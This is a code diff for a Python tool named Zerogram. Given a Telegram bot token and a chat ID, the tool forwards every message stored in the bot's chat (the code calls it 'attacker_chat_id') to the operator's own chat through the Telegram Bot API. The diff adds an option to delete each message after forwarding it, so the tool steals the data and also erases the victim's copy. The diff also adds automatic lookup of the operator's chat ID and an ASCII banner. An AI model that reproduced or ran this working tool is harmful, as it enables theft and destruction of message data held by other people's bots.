@@ -43,6 +43,7 @@ client = TelegramClient("anon_session", api_id,
 
 TELEGRAM_API_URL = "https://api.telegram.org/bot"
 TELEGRAM_API_FILE_URL = "https://api.telegram.org/file/bot"
+DEFAULT_MESSAGE = """ID: 203132675, Method: license, Input: 5870174"""
 
 
 class Zerogram:
@@ -53,9 +54,7 @@ class Zerogram:
         self.bot_username = None
         self.my_chat_id = None
         self.last_message_id = None
-        self.stop_flag = False
         self.current_msg_id = msg_id
-        self.max_older_attempts = 200
         self.users = set()
         self.session = requests.Session()
 
@@ -328,11 +327,29 @@ class Zerogram:
         except Exception as e:
             print(f"[-] Download file error: {e}")
 
-    def start(self):
+    def get_my_chat_id(self) -> str:
+        try:
+            r = requests.get(f"{TELEGRAM_API_URL}{self.bot_token}/getUpdates")
+            data = r.json()
+
+            if data.get("ok") and data.get("result"):
+                last_update = data["result"][-1]
+                if "message" in last_update:
+                    return str(last_update["message"]["chat"]["id"])
+
+            else:
+                print(f"[-] Get updates error: {data}")
+
+        except Exception as e:
+            print(f"[-] Get my chat ID error: {e}")
+
+        return None
+
+    def initialize(self) -> bool:
         raw_token = self.bot_token.strip()
         if not raw_token:
             print("[!] Bot Token cannot be empty!")
-            return
+            return False
 
         parsed_token = self.parse_bot_token(raw_token)
         bot_id, first_name, bot_user, chat_member_count = self.get_bot_info(
@@ -340,7 +357,7 @@ class Zerogram:
 
         if not bot_id or not first_name or not bot_user or not chat_member_count:
             print("[!] get_bot_info failed or not a valid bot token!")
-            return
+            return False
 
         self.bot_token = parsed_token
         self.bot_username = bot_user
@@ -349,36 +366,37 @@ class Zerogram:
 
         if not last_message_id:
             print("[!] Failed to get last message ID!")
-            return
-
-        self.my_chat_id = self.chatid_entry.strip()
-        if not self.my_chat_id:
-            print("[!] No attacker chat ID provided.")
-            return
+            return False
 
         self.last_message_id = last_message_id
         info_msg = f"""
         ╔══════════ BOT STATUS ══════════╗
         ║ Bot Username     : @{bot_user}
-        ║ My Chat ID       : {self.my_chat_id}
+        ║ Attacker Chat ID : {self.chatid_entry}
         ║ Chat Member Count: {chat_member_count}
         ║ Last Message ID  : {last_message_id}
         ╚════════════════════════════════╝
         """
 
         print(info_msg)
-        input("Press Enter to continue...")
+        return True
 
+    def start(self, delete_messages: bool = False) -> None:
         loop = asyncio.get_event_loop()
-        loop.run_until_complete(self.telethon_send_start(bot_user))
+        loop.run_until_complete(self.telethon_send_start(self.bot_username))
+
+        self.my_chat_id = self.get_my_chat_id()
+        if not self.my_chat_id:
+            print("[!] Failed to get my chat ID!")
+            return
 
         if self.current_msg_id > 0:
             print(f"Starting from message ID {self.current_msg_id}")
 
         self.forward_all_messages(
-            attacker_chat_id=self.my_chat_id, start_id=self.current_msg_id)
+            attacker_chat_id=self.chatid_entry, start_id=self.current_msg_id, delete=delete_messages)
 
-    def forward_all_messages(self, attacker_chat_id: str, start_id: int = 0) -> None:
+    def forward_all_messages(self, attacker_chat_id: str, start_id: int = 0, delete: bool = False) -> None:
         if self.last_message_id is None:
             self.last_message_id = 0
 
@@ -390,13 +408,14 @@ class Zerogram:
                 self.bot_token, attacker_chat_id, self.my_chat_id, msg_id)
             if ok:
                 success_count += 1
+                if delete:
+                    self.delete_message(attacker_chat_id, msg_id)
 
-        if not self.stop_flag:
-            txt = f"Forwarded from ID {start_id}..{max_id}, total success: {success_count}, total users: {len(self.users)}"
+        txt = f"Forwarded from ID {start_id}..{max_id}, total success: {success_count}, total users: {len(self.users)}"
 
-            print("[Result] " + txt.replace("\n", " | "))
+        print("[Result] " + txt.replace("\n", " | "))
 
-    def send_message(self, chat_id: str, message: str) -> int:
+    def send_message(self, chat_id: str, message: str = DEFAULT_MESSAGE) -> int:
         payload = {
             "chat_id": chat_id,
             "text": message
@@ -420,9 +439,9 @@ class Zerogram:
             print(f"[-] Send message error: {e}")
 
     def get_last_message_id(self) -> int:
-        return self.send_message(self.chatid_entry, ".")
+        return self.send_message(self.chatid_entry)
 
-    def delete_message(self, chat_id: str, message_id: int) -> bool:
+    def delete_message(self, chat_id: str, message_id: int) -> None:
         payload = {
             "chat_id": chat_id,
             "message_id": message_id
@@ -437,13 +456,13 @@ class Zerogram:
             data = r.json()
 
             if data.get("ok"):
-                return True
+                print(
+                    f"[+] Deleted message ID {message_id} in chat {chat_id}.")
             else:
-                return False
+                print(f"[-] Delete message error: {data}")
 
         except Exception as e:
             print(f"[-] Delete message error: {e}")
-            return False
 
     def delete_messages(self) -> None:
         chat_id = self.chatid_entry
@@ -456,12 +475,8 @@ class Zerogram:
         print(
             f"Deleting messages in chat {chat_id} starting from ID {last_msg}...")
         try:
-            for msg_id in range(last_msg, 0, -1):
-                success = self.delete_message(chat_id, msg_id)
-                if success:
-                    print(f"[+] Deleted message ID {msg_id}.")
-                else:
-                    print(f"[-] Failed to delete message ID {msg_id}.")
+            for msg_id in range(0, last_msg + 1):
+                self.delete_message(chat_id, msg_id)
 
             print("All messages deleted successfully.")
         except Exception as e:
@@ -664,8 +679,27 @@ def parse_args():
     return parser.parse_args()
 
 
+def print_banner():
+    banner = """
+/$$$$$$$$                                                                          
+|_____ $$                                                                           
+     /$$/   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$/$$$$ 
+    /$$/   /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ |____  $$| $$_  $$_  $$
+   /$$/   | $$$$$$$$| $$  \__/| $$  \ $$| $$  \ $$| $$  \__/  /$$$$$$$| $$ \ $$ \ $$
+  /$$/    | $$_____/| $$      | $$  | $$| $$  | $$| $$       /$$__  $$| $$ | $$ | $$
+ /$$$$$$$$|  $$$$$$$| $$      |  $$$$$$/|  $$$$$$$| $$      |  $$$$$$$| $$ | $$ | $$
+|________/ \_______/|__/       \______/  \____  $$|__/       \_______/|__/ |__/ |__/
+                                         /$$  \ $$                                  
+                                        |  $$$$$$/                                  
+                                         \______/                                   
+    """
+    print(banner)
+
+
 if __name__ == "__main__":
     args = parse_args()
+
+    print_banner()
 
     if not args.token or not args.chatid:
         print("Error", "Bot Token and Chat ID cannot be empty!")
@@ -719,4 +753,10 @@ if __name__ == "__main__":
 
         exit(0)
 
-    bot.start()
+    if bot.initialize():
+        delete_messages = input(
+            "Delete the messages after forwarding? (y/n): ").strip().lower() == 'y'
+
+        bot.start(delete_messages=delete_messages)
+
+# 🇮🇱
